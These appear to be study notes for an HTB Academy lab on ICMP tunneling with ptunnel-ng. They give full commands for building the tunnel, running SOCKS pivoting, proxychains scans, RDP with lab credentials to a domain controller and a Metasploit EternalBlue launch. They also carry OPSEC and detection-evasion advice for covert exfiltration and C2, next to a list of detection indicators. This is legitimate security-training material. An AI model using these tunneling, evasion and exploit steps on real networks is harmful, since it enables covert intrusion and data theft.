# **ICMP Tunneling with SOCKS - HTB Academy Page 14**

## **📋 Module Overview**

**Purpose:** Traffic encapsulation within ICMP echo requests/responses  
**Tool:** ptunnel-ng - ICMP tunnel implementation  
**Protocol:** ICMP (Internet Control Message Protocol)  
**Advantage:** Bypasses firewalls that allow ping, stealth communication  
**Use Case:** Data exfiltration, covert channels, firewall bypass  

---

## **1. Introduction to ICMP Tunneling**

### **What is ICMP Tunneling?**
- **Protocol:** Uses ICMP echo requests and responses for data transmission
- **Encapsulation:** Traffic hidden within ping packets
- **Stealth:** Appears as legitimate network diagnostics
- **Firewall Bypass:** Works when ping is allowed outbound
- **Bidirectional:** Full communication channel support

### **How ICMP Tunneling Works**
```
[Internal Host] → [Firewall] → [External Server]
ICMP Echo Req     Allows Ping    ptunnel-ng Server
Data in Payload   No Deep Insp   Extracts Data
SSH/TCP Traffic   Passes Through  Forwards to Target
```

### **ICMP Tunneling Use Cases**
1. **Restrictive Firewalls** - only ICMP allowed outbound
2. **Data Exfiltration** - covert data transmission
3. **Command & Control** - stealth C2 channels
4. **Network Pivoting** - access internal networks
5. **Security Testing** - demonstrate firewall weaknesses

### **ICMP vs Other Tunneling Protocols**

| **Aspect** | **ICMP** | **DNS** | **HTTP** | **SSH** |
|------------|----------|---------|----------|---------|
| **Stealth** | Very High | High | Medium | Low |
| **Firewall Bypass** | Excellent | Excellent | Good | Limited |
| **Performance** | Low | Low | Medium | High |
| **Setup Complexity** | Medium | Medium | Low | Low |
| **Detection Difficulty** | Hard | Hard | Medium | Easy |
| **Payload Size** | Small | Small | Large | Large |

---

## **2. ptunnel-ng Overview**

### **What is ptunnel-ng?**
- **Evolution:** Next generation of original ptunnel
- **Language:** C implementation
- **Platform:** Linux/Unix systems
- **Features:** ICMP tunneling with TCP forwarding
- **Modes:** Client-server architecture
- **Security:** Basic authentication support

### **ptunnel-ng Architecture**
```
[Attack Host] ←ICMP→ [Pivot Host] ←TCP→ [Target Services]
ptunnel Client      ptunnel Server      SSH, RDP, etc.
Local Port 2222     ICMP Listener       Internal Network
TCP to ICMP         ICMP to TCP         172.16.5.0/23
```

### **Key Features**
- **Protocol Translation** - TCP to ICMP conversion
- **Port Forwarding** - local port to remote service
- **Session Management** - multiple concurrent tunnels
- **Statistics** - traffic monitoring and analysis
- **Privilege Management** - drops privileges after setup

---

## **3. Installation and Setup**

### **Method 1: Git Clone and Build**

#### **Clone Repository**
```bash
# Clone ptunnel-ng from GitHub
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng/

# Check repository structure
ls -la
# autogen.sh, configure.ac, src/, etc.
```

#### **Install Build Dependencies**
```bash
# Install required build tools
sudo apt update
sudo apt install automake autoconf build-essential

# For static binary compilation
sudo apt install libc6-dev-i386
```

#### **Compile Standard Binary**
```bash
# Run autogen script to configure and build
sudo ./autogen.sh

# Expected output:
# ++ pwd
# + OLD_WD=/path/to/ptunnel-ng
# + autoreconf -fi
# + ./configure
# + make clean
# + make -j4 all

# Binary location
ls -la src/ptunnel-ng
```

#### **Compile Static Binary (Recommended)**
```bash
# Create static binary for better portability
sudo apt install automake autoconf -y
cd ptunnel-ng/

# Modify autogen.sh for static compilation
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh

# Build static binary
./autogen.sh

# Verify static linking
file src/ptunnel-ng
# Should show: statically linked
```

### **Method 2: Cross-Compilation for x86_64**

#### **For ARM64 Host (M1/M2 Kali)**
```bash
# Install cross-compiler
sudo apt install gcc-x86-64-linux-gnu

# Configure for x86_64 target
export CC=x86_64-linux-gnu-gcc
./configure --host=x86_64-linux-gnu

# Build for x86_64
make clean && make

# Verify architecture
file src/ptunnel-ng
# Should show: x86-64
```

### **Architecture Compatibility Issues**
```bash
# Common problem: ARM binary on x86_64 target
# Error: ./ptunnel-ng: 1: @@l@8: not found
# Error: ELF��: not found

# Solution: Always match target architecture
# ARM64 Kali → x86_64 Ubuntu = cross-compile needed
# x86_64 Kali → x86_64 Ubuntu = direct compile works
```

---

## **4. Server Setup (Pivot Host)**

### **Transfer Binary to Pivot Host**

#### **Method 1: SCP Transfer**
```bash
# Transfer entire repository
scp -r ptunnel-ng ubuntu@10.129.202.64:~/

# Or transfer just the binary
scp ptunnel-ng/src/ptunnel-ng ubuntu@10.129.202.64:~/
```

#### **Method 2: Compile on Target**
```bash
# SSH to target and compile locally (avoids arch issues)
ssh ubuntu@10.129.202.64

# Install dependencies on target
sudo apt update
sudo apt install automake autoconf build-essential git

# Clone and build on target
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng/
sudo ./autogen.sh
```

### **Start ptunnel-ng Server**

#### **Basic Server Configuration**
```bash
# Start server on pivot host
ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22

# Expected output:
[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Forwarding incoming ping packets over TCP.
[inf]: Ping proxy is listening in privileged mode.
[inf]: Dropping privileges now.
```

#### **Server Parameters Explanation**
```bash
# Command breakdown:
sudo ./ptunnel-ng -r10.129.202.64 -R22

# -r10.129.202.64  : IP address to accept connections from
# -R22             : Forward to local port 22 (SSH)
# sudo             : Required for ICMP socket privileges
```

#### **Common Server Issues**
```bash
# Problem: libselinux warning
./ptunnel-ng: /lib/x86_64-linux-gnu/libselinux.so.1: no version information available

# Solution: Usually safe to ignore, or install libselinux1-dev

# Problem: Permission denied for ICMP
[err]: Could not create ICMP socket: Operation not permitted

# Solution: Run with sudo
sudo ./ptunnel-ng -r10.129.202.64 -R22
```

---

## **5. Client Setup (Attack Host)**

### **Connect to ptunnel-ng Server**

#### **Basic Client Connection**
```bash
# Connect from attack host to server
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

# Expected output:
[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Relaying packets from incoming TCP streams.
```

#### **Client Parameters Explanation**
```bash
# Command breakdown:
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

# -p10.129.202.64  : Target server IP (where ICMP server runs)
# -l2222           : Local port to listen on
# -r10.129.202.64  : Remote IP to forward to
# -R22             : Remote port to forward to
```

### **Test ICMP Tunnel**

#### **SSH Through ICMP Tunnel**
```bash
# Connect via local port 2222 (tunneled through ICMP)
ssh -p2222 -lubuntu 127.0.0.1

# If successful:
ubuntu@127.0.0.1's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
ubuntu@WEB01:~$
```

#### **Verify Tunnel Statistics**
```bash
# Server side shows session statistics:
[inf]: Incoming tunnel request from 10.10.14.18.
[inf]: Starting new session to 10.129.202.64:22 with ID 20199
[inf]: Received session close from remote peer.
[inf]: 
Session statistics:
[inf]: I/O:   0.00/  0.00 mb ICMP I/O/R:      248/      22/       0 Loss:  0.0%
```

---

## **6. Advanced Usage - Dynamic Port Forwarding**

### **SSH Dynamic Port Forwarding**

#### **Setup SOCKS Proxy Through ICMP**
```bash
# Establish dynamic port forwarding over ICMP tunnel
ssh -D 9050 -p2222 -lubuntu 127.0.0.1

# This creates SOCKS proxy on port 9050
# All traffic routes through ICMP tunnel
```

#### **Configure Proxychains**
```bash
# Edit proxychains configuration
sudo nano /etc/proxychains4.conf

# Add SOCKS proxy entry
[ProxyList]
socks4 127.0.0.1 9050

# Verify configuration
tail -5 /etc/proxychains4.conf
```

### **Network Scanning Through ICMP Tunnel**

#### **Proxychains + Nmap**
```bash
# Scan internal network through ICMP tunnel
proxychains nmap -sV -sT 172.16.5.19 -p3389

# Expected output:
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-11 11:10 EDT
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
Nmap scan report for 172.16.5.19
Host is up (0.12s latency).

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```

#### **Service Enumeration**
```bash
# Comprehensive port scan through tunnel
proxychains nmap -sT -Pn 172.16.5.0/24

# Service version detection
proxychains nmap -sV -sT -p 80,443,3389,5985 172.16.5.19

# Script scanning
proxychains nmap -sC -sV -p 3389 172.16.5.19
```

---

## **7. HTB Academy Lab Exercise**

### **Lab Challenge**
**"Using the concepts taught thus far, connect to the target and establish an ICMP tunnel. Pivot to the DC (172.16.5.19, victor:pass@123) and submit the contents of C:\Users\victor\Downloads\flag.txt as the answer."**

### **Lab Environment**
- **Target SSH:** 10.129.202.64 with credentials `ubuntu:HTB_@cademy_stdnt!`
- **Internal Network:** 172.16.5.0/23
- **Domain Controller:** 172.16.5.19
- **DC Credentials:** `victor:pass@123`
- **Flag Location:** `C:\Users\victor\Downloads\flag.txt`

### **Complete Lab Solution**

#### **Step 1: Setup ptunnel-ng on Attack Host**
```bash
# Clone and build ptunnel-ng
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng/

# Install dependencies
sudo apt update
sudo apt install automake autoconf build-essential

# Build binary
sudo ./autogen.sh

# Verify binary works
ls -la src/ptunnel-ng
./src/ptunnel-ng --help
```

#### **Step 2: Transfer to Pivot Host**
```bash
# Transfer repository to target
scp -r ptunnel-ng ubuntu@10.129.202.64:~/

# Or compile on target to avoid architecture issues
ssh ubuntu@10.129.202.64
sudo apt update
sudo apt install automake autoconf build-essential git
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng/
sudo ./autogen.sh
```

#### **Step 3: Start Server on Pivot Host**
```bash
# SSH to pivot host
ssh ubuntu@10.129.202.64
# Password: HTB_@cademy_stdnt!

# Start ptunnel-ng server
cd ptunnel-ng/src/
sudo ./ptunnel-ng -r10.129.202.64 -R22

# Expected output:
[inf]: Starting ptunnel-ng 1.42.
[inf]: Forwarding incoming ping packets over TCP.
[inf]: Ping proxy is listening in privileged mode.
[inf]: Dropping privileges now.
```

#### **Step 4: Connect Client from Attack Host**
```bash
# Start ptunnel-ng client (new terminal on attack host)
cd ptunnel-ng/src/
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

# Expected output:
[inf]: Starting ptunnel-ng 1.42.
[inf]: Relaying packets from incoming TCP streams.
```

#### **Step 5: Test ICMP Tunnel**
```bash
# Test SSH connection through ICMP tunnel
ssh -p2222 -lubuntu 127.0.0.1

# Should connect successfully:
ubuntu@127.0.0.1's password: HTB_@cademy_stdnt!
Welcome to Ubuntu 20.04.3 LTS
ubuntu@WEB01:~$
```

#### **Step 6: Setup Dynamic Port Forwarding**
```bash
# Establish SOCKS proxy through ICMP tunnel
ssh -D 9050 -p2222 -lubuntu 127.0.0.1

# Keep this session open for proxy
```

#### **Step 7: Configure Proxychains**
```bash
# Edit proxychains configuration (new terminal)
sudo nano /etc/proxychains4.conf

# Ensure SOCKS4 proxy is configured:
[ProxyList]
socks4 127.0.0.1 9050

# Verify configuration
tail -5 /etc/proxychains4.conf
```

#### **Step 8: Scan Internal Network**
```bash
# Scan Domain Controller through ICMP tunnel
proxychains nmap -sT -Pn 172.16.5.19 -p 3389

# Should show RDP service:
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
```

#### **Step 9: RDP to Domain Controller**
```bash
# RDP through ICMP tunnel to DC
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123'

# Accept certificate when prompted
```

#### **Step 10: Retrieve Flag**
```cmd
# In RDP session, open Command Prompt
# Navigate to Downloads folder
cd C:\Users\victor\Downloads\

# List files
dir

# Read flag content
type flag.txt

# Submit flag content as answer
```

#### **Lab Solution Summary**
```bash
# Attack Host - Terminal 1: Setup
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng/ && sudo ./autogen.sh
scp -r ptunnel-ng ubuntu@10.129.202.64:~/

# Pivot Host: Start Server
ssh ubuntu@10.129.202.64
cd ptunnel-ng/src/
sudo ./ptunnel-ng -r10.129.202.64 -R22

# Attack Host - Terminal 2: Start Client
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22

# Attack Host - Terminal 3: Dynamic Forwarding
ssh -D 9050 -p2222 -lubuntu 127.0.0.1

# Attack Host - Terminal 4: Access DC
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123'
# In RDP: type C:\Users\victor\Downloads\flag.txt
```

---

## **8. Network Traffic Analysis**

### **Wireshark Analysis**

#### **Normal SSH Traffic**
```bash
# Command: ssh ubuntu@10.129.202.64
# Wireshark shows:
- TCP handshake to port 22
- SSHv2 protocol packets
- Encrypted SSH payload data
- Clear TCP/SSH packet headers
```

#### **ICMP Tunneled SSH Traffic**
```bash
# Command: ssh -p2222 -lubuntu 127.0.0.1
# Wireshark shows:
- ICMP Echo Request packets
- ICMP Echo Reply packets
- Payload contains tunneled SSH data
- No visible TCP/SSH headers
- Appears as ping traffic to security tools
```

### **Traffic Characteristics**
```bash
# ICMP tunnel characteristics:
- Type: ICMP (Protocol 1)
- Echo Request (Type 8, Code 0)
- Echo Reply (Type 0, Code 0)
- Payload: Encapsulated TCP data
- Frequency: Regular ping-like intervals
- Size: Variable payload sizes (unusual for ping)
```

### **Detection Signatures**
```bash
# Potential detection indicators:
1. Large ICMP payload sizes
2. High frequency ICMP traffic
3. Regular bidirectional ICMP flows
4. ICMP traffic to non-standard destinations
5. Payload entropy analysis (encrypted data)
```

---

## **9. Troubleshooting**

### **Common Issues**

#### **Architecture Mismatch**
```bash
# Problem: Binary won't execute on target
./ptunnel-ng: 1: @@l@8: not found
./ptunnel-ng: 1: ELF��: not found

# Cause: ARM64 binary on x86_64 system

# Solutions:
1. Compile on target system
   ssh target && git clone && ./autogen.sh

2. Cross-compile on attack host
   export CC=x86_64-linux-gnu-gcc
   ./configure --host=x86_64-linux-gnu

3. Use static binary compilation
   sed -i '$s/.*/LDFLAGS=-static ...' autogen.sh
```

#### **Permission Issues**
```bash
# Problem: ICMP socket creation fails
[err]: Could not create ICMP socket: Operation not permitted

# Solution: Run with sudo
sudo ./ptunnel-ng -r10.129.202.64 -R22

# Problem: Privilege dropping fails
[err]: Could not drop privileges

# Solution: Check user/group permissions
sudo chown root:root ptunnel-ng
sudo chmod 4755 ptunnel-ng
```

#### **Connection Issues**
```bash
# Problem: No ICMP responses
[inf]: No response from target

# Solutions:
1. Check ICMP is allowed by firewall
   ping 10.129.202.64

2. Verify server is running
   ps aux | grep ptunnel

3. Check server IP binding
   netstat -an | grep icmp
```

#### **Performance Issues**
```bash
# Problem: Slow tunnel performance
# ICMP has inherent limitations

# Optimizations:
1. Reduce MTU size
   ip link set dev eth0 mtu 1200

2. Adjust tunnel parameters
   ./ptunnel-ng -m 1024 -p target

3. Use compression for SSH
   ssh -C -p2222 -lubuntu 127.0.0.1
```

---

## **10. Operational Security (OPSEC)**

### **Stealth Considerations**
1. **Traffic Appearance** - looks like diagnostic ping traffic
2. **Payload Size** - unusual ICMP payload sizes may trigger alerts
3. **Frequency** - high-frequency pings may be suspicious
4. **Timing** - regular intervals could indicate automation
5. **Destination** - multiple ICMP flows to same target

### **Detection Evasion**
```bash
# Use irregular timing patterns
# Avoid sustained high-volume traffic
# Monitor for security tool alerts
# Use legitimate-looking source IPs
# Limit session duration
```

### **Network Monitoring Evasion**
```bash
# Techniques to avoid detection:
1. Rate limiting - space out ICMP packets
2. Size variation - vary payload sizes
3. Jitter - add random delays
4. Multiple paths - use different routes
5. Traffic mixing - blend with legitimate pings
```

---

## **11. Integration with Other Techniques**

### **Multi-hop ICMP Tunneling**
```bash
# Chain multiple ICMP tunnels
[Attack] → ICMP → [Pivot1] → ICMP → [Pivot2] → [Target]

# Setup cascaded tunnels
# Pivot1: ptunnel-ng server + client
# Each hop forwards to next
```

### **ICMP + SSH Port Forwarding**
```bash
# Combine ICMP tunnel with SSH forwarding
ssh -L 8080:172.16.5.19:80 -p2222 -lubuntu 127.0.0.1

# Now port 8080 tunnels through ICMP to internal web server
curl http://127.0.0.1:8080
```

### **ICMP + Metasploit**
```bash
# Use ICMP tunnel for Metasploit payloads
# Setup SOCKS proxy through ICMP
ssh -D 9050 -p2222 -lubuntu 127.0.0.1

# Configure Metasploit to use proxy
setg Proxies socks4:127.0.0.1:9050

# Launch exploits through ICMP tunnel
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 172.16.5.19
exploit
```

---

## **12. Alternative ICMP Tunneling Tools**

### **Tool Comparison**

| **Tool** | **Language** | **Features** | **Platform** | **Stealth** |
|----------|--------------|--------------|--------------|-------------|
| **ptunnel-ng** | C | TCP forwarding | Linux/Unix | High |
| **icmptunnel** | Python | Raw ICMP | Cross-platform | High |
| **ICMP-TransferTools** | PowerShell | File transfer | Windows | Medium |
| **pingfs** | C | Filesystem over ICMP | Linux | Very High |
| **ICMPDoor** | C | ICMP backdoor | Linux/Windows | High |

### **When to Use ICMP Tunneling**
✅ **Restrictive firewall environments**  
✅ **Only ICMP allowed outbound**  
✅ **Stealth communication required**  
✅ **Data exfiltration scenarios**  
✅ **Security testing engagements**  

### **Limitations**
❌ **Low bandwidth performance**  
❌ **High latency connections**  
❌ **Small payload size restrictions**  
❌ **Deep packet inspection environments**  
❌ **ICMP rate limiting policies**  

---

## **References**

- **HTB Academy**: Pivoting, Tunneling & Port Forwarding - Page 14
- **ptunnel-ng GitHub**: [Official Repository](https://github.com/utoni/ptunnel-ng)
- **Original ptunnel**: [Legacy Implementation](http://www.cs.uit.no/~daniels/PingTunnel/)
- **ICMP RFC**: [RFC 792 - Internet Control Message Protocol](https://tools.ietf.org/html/rfc792)
- **Network Tunneling**: [SANS Tunneling Guide](https://www.sans.org/reading-room/whitepapers/protocols/tunneling-protocols-security-issues-1674)
- **Covert Channels**: [ICMP Covert Channel Analysis](https://www.symantec.com/connect/articles/icmp-covert-channel-analysis) 